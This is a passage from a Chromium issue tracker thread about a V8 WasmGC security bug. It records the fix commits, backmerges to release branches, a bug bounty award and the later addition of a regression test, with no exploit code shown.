Cr-Commit-Position: refs/branch-heads/5845@{#418}
Cr-Branched-From: 5a5dff63a4a4c63b9b18589819bebb2566c85443-refs/heads/main@{#1160321}

[modify] https://crrev.com/8d01f1b988464c6d3e53fb0eb950a36a846a7b11/DEPS


### am...@chromium.org (2023-07-13)

The combined changes in https://chromium-review.googlesource.com/c/v8/v8/+/4677663 are approved for merge to M115, please merge to 11.5-lkgr at your earliest convenience. This fix will ship in the first M115/Stable update / respin. 

Please hold off merging to 114 until the Extended Stable RC has been cut. Thank you! 

### am...@chromium.org (2023-07-14)

Please hold off merging to 115 and 114 for now. M115 will need to be recut tonight or Monday for an enterprise-relevant fix, so we've been asked to hold off new merges until after the recut.

### rz...@google.com (2023-07-17)

[Empty comment from Monorail migration]

### rz...@google.com (2023-07-17)

[Empty comment from Monorail migration]

### jk...@chromium.org (2023-07-17)

#32: The WasmGC Origin Trial is not enabled for M108, so I don't think a merge is necessary.

### [Deleted User] (2023-07-17)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)



For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### rz...@google.com (2023-07-17)

1. Just https://crrev.com/c/4689677
2. Low, just a simple conflict
3. 116
4. Yes

### am...@chromium.org (2023-07-17)

Merges approved for M115 and M114. 
Please merge this fix to 11.5-lkgr and 11.4-lkgr at your earliest convenience -- thank you! 


### gi...@appspot.gserviceaccount.com (2023-07-18)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/cc27fded5beff8b6c0b344851c3ccb3a597fddc7

commit cc27fded5beff8b6c0b344851c3ccb3a597fddc7
Author: Jakob Kummerow <jkummerow@chromium.org>
Date: Mon Jul 17 16:52:57 2023

[wasm-gc] Merge a few fixes

This commit cherry-picks small parts of:
crrev.com/c/4669597
crrev.com/c/4675296
crrev.com/c/4677170
that are suitable for backmerging.

Bug: chromium:1462951
Change-Id: I220498dc89a34b83c74e8f802b1089f700fb035d
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/4684072
Auto-Submit: Jakob Kummerow <jkummerow@chromium.org>
Commit-Queue: Manos Koukoutos <manoskouk@chromium.org>
Reviewed-by: Manos Koukoutos <manoskouk@chromium.org>
Cr-Commit-Position: refs/branch-heads/11.4@{#55}
Cr-Branched-From: 8a8a1e7086dacc426965d3875914efa66663c431-refs/heads/11.4.183@{#1}
Cr-Branched-From: 5483d8e816e0bbce865cbbc3fa0ab357e6330bab-refs/heads/main@{#87241}

[modify] https://crrev.com/cc27fded5beff8b6c0b344851c3ccb3a597fddc7/src/wasm/wasm-objects.cc
[modify] https://crrev.com/cc27fded5beff8b6c0b344851c3ccb3a597fddc7/test/unittests/wasm/function-body-decoder-unittest.cc
[modify] https://crrev.com/cc27fded5beff8b6c0b344851c3ccb3a597fddc7/src/wasm/baseline/liftoff-compiler.cc
[modify] https://crrev.com/cc27fded5beff8b6c0b344851c3ccb3a597fddc7/src/wasm/function-body-decoder-impl.h


### gi...@appspot.gserviceaccount.com (2023-07-18)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/96fc6d931c9714a347322572048aa83772a65e4e

commit 96fc6d931c9714a347322572048aa83772a65e4e
Author: Jakob Kummerow <jkummerow@chromium.org>
Date: Tue Jul 11 11:40:26 2023

[wasm-gc] Merge a few fixes

This commit cherry-picks small parts of:
crrev.com/c/4669597
crrev.com/c/4675296
crrev.com/c/4677170
that are suitable for backmerging.

Bug: chromium:1462951
Change-Id: Ic8994753c3bdbf9676701ce3ab8c98ae9700156b
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/4677663
Auto-Submit: Jakob Kummerow <jkummerow@chromium.org>
Reviewed-by: Manos Koukoutos <manoskouk@chromium.org>
Commit-Queue: Manos Koukoutos <manoskouk@chromium.org>
Cr-Commit-Position: refs/branch-heads/11.5@{#35}
Cr-Branched-From: 0c4044b7336787781646e48b2f98f0c7d1b400a5-refs/heads/11.5.150@{#1}
Cr-Branched-From: b71d3038a7d99c79e1c21239e8ae07da5fc8c90b-refs/heads/main@{#87781}

[modify] https://crrev.com/96fc6d931c9714a347322572048aa83772a65e4e/src/wasm/wasm-objects.cc
[modify] https://crrev.com/96fc6d931c9714a347322572048aa83772a65e4e/test/unittests/wasm/function-body-decoder-unittest.cc
[modify] https://crrev.com/96fc6d931c9714a347322572048aa83772a65e4e/src/wasm/baseline/liftoff-compiler.cc
[modify] https://crrev.com/96fc6d931c9714a347322572048aa83772a65e4e/src/wasm/function-body-decoder-impl.h


### gi...@appspot.gserviceaccount.com (2023-07-18)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/ce6323c143f19d9d17a59d7db645a888c6ac774b

commit ce6323c143f19d9d17a59d7db645a888c6ac774b
Author: Chrome Release Autoroll <chromium-release-autoroll@skia-public.iam.gserviceaccount.com>
Date: Tue Jul 18 10:16:24 2023

Roll v8 11.5 from 02a41ee75deb to b78fc4345a6e (2 revisions)

https://chromium.googlesource.com/v8/v8.git/+log/02a41ee75deb..b78fc4345a6e

2023-07-18 v8-ci-autoroll-builder@chops-service-accounts.iam.gserviceaccount.com Version 11.5.150.18
2023-07-18 jkummerow@chromium.org [wasm-gc] Merge a few fixes

If this roll has caused a breakage, revert this CL and stop the roller
using the controls here:
https://autoroll.skia.org/r/v8-11-5-chromium-m115
Please CC liviurau@google.com,v8-waterfall-sheriff@grotations.appspotmail.com,vahl@google.com on the revert to ensure that a human
is aware of the problem.

To file a bug in v8 11.5: https://bugs.chromium.org/p/v8/issues/entry
To file a bug in Chromium m115: https://bugs.chromium.org/p/chromium/issues/entry

To report a problem with the AutoRoller itself, please file a bug:
https://bugs.chromium.org/p/skia/issues/entry?template=Autoroller+Bug

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md

Bug: chromium:1462951
Tbr: v8-waterfall-sheriff@grotations.appspotmail.com
Change-Id: Ia4aa0dd7f100a36d51c662cd3ed9355073570867
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4691414
Bot-Commit: Chrome Release Autoroll <chromium-release-autoroll@skia-public.iam.gserviceaccount.com>
Commit-Queue: Chrome Release Autoroll <chromium-release-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/branch-heads/5790@{#1752}
Cr-Branched-From: 1d71a337b1f6e707a13ae074dca1e2c34905eb9f-refs/heads/main@{#1148114}

[modify] https://crrev.com/ce6323c143f19d9d17a59d7db645a888c6ac774b/DEPS


### gi...@appspot.gserviceaccount.com (2023-07-18)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/15958f753360c9fa6eabe835217a094ca816ce8b

commit 15958f753360c9fa6eabe835217a094ca816ce8b
Author: Chrome Release Autoroll <chromium-release-autoroll@skia-public.iam.gserviceaccount.com>
Date: Tue Jul 18 12:12:39 2023

Roll v8 11.4 from 45b9fbcc1bb2 to d7561b88d067 (2 revisions)

https://chromium.googlesource.com/v8/v8.git/+log/45b9fbcc1bb2..d7561b88d067

2023-07-18 v8-ci-autoroll-builder@chops-service-accounts.iam.gserviceaccount.com Version 11.4.183.28
2023-07-18 jkummerow@chromium.org [wasm-gc] Merge a few fixes

If this roll has caused a breakage, revert this CL and stop the roller
using the controls here:
https://autoroll.skia.org/r/v8-11-4-chromium-m114
Please CC liviurau@google.com,v8-waterfall-sheriff@grotations.appspotmail.com,vahl@google.com on the revert to ensure that a human
is aware of the problem.

To file a bug in v8 11.4: https://bugs.chromium.org/p/v8/issues/entry
To file a bug in Chromium m114: https://bugs.chromium.org/p/chromium/issues/entry

To report a problem with the AutoRoller itself, please file a bug:
https://bugs.chromium.org/p/skia/issues/entry?template=Autoroller+Bug

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md

Bug: chromium:1462951
Tbr: v8-waterfall-sheriff@grotations.appspotmail.com
Change-Id: If36c7e7f16bf9570d11877c19f421381253399b3
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4692375
Bot-Commit: Chrome Release Autoroll <chromium-release-autoroll@skia-public.iam.gserviceaccount.com>
Commit-Queue: Chrome Release Autoroll <chromium-release-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/branch-heads/5735@{#1483}
Cr-Branched-From: 2f562e4ddbaf79a3f3cb338b4d1bd4398d49eb67-refs/heads/main@{#1135570}

[modify] https://crrev.com/15958f753360c9fa6eabe835217a094ca816ce8b/DEPS


### gm...@google.com (2023-07-18)

[Empty comment from Monorail migration]

### am...@google.com (2023-07-19)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2023-07-19)

Congratulations Jerry! The VRP Panel has decided to award you $20,000 for this report + V8 exploit bonus. In assessment, we do not consider this issue eligible for the patch bonus, as while similar, the patch you provided was not used and the change was not a complex change. We do appreciate this report as a whole and consider it a high-quality report, thus the total reward amount. 
A member of our finance team will be in touch with you soon to arrange payment. Thank you for your effort and reporting this issue to us -- great work!!! 

### je...@gmail.com (2023-07-19)

[Comment Deleted]

### je...@gmail.com (2023-07-19)

[Comment Deleted]

### am...@google.com (2023-07-22)

[Empty comment from Monorail migration]

### am...@chromium.org (2023-07-24)

[Description Changed]

### vo...@google.com (2023-07-27)

[Empty comment from Monorail migration]

### am...@chromium.org (2023-08-01)

[Empty comment from Monorail migration]

### am...@google.com (2023-08-02)

[Empty comment from Monorail migration]

### pg...@google.com (2023-08-03)

[Empty comment from Monorail migration]

### gm...@google.com (2023-08-07)

[Empty comment from Monorail migration]

### jk...@chromium.org (2023-08-08)

#52: You've seen #33, right? No merge to 108 is necessary. (On closer inspection it turns out that in addition to the Origin Trial not being enabled, the bug also hadn't been introduced yet.)

### rz...@google.com (2023-08-08)

Missed this comment, thanks. I will abandon the CL.

### [Deleted User] (2023-10-16)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### je...@gmail.com (2023-10-18)

Credit: 5f46f4ee2e17957ba7b39897fb376be8

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1462951?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

### ap...@google.com (2024-02-27)

Project: v8/v8
Branch: main

commit 179110353d97ecb426100188333531b43a6b3b7d
Author: Manos Koukoutos <manoskouk@chromium.org>
Date:   Tue Feb 27 16:16:01 2024

    [wasm][liftoff] Missing test for security bug
    
    Bug: chromium:1462951
    Change-Id: I249415ed55d19feab48a27c3869a4a6ceeb72bfe
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5319506
    Reviewed-by: Matthias Liedtke <mliedtke@chromium.org>
    Auto-Submit: Manos Koukoutos <manoskouk@chromium.org>
    Commit-Queue: Manos Koukoutos <manoskouk@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#92562}

A       test/mjsunit/regress/wasm/regress-1462951.js

https://chromium-review.googlesource.com/5319506


---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40067050)*
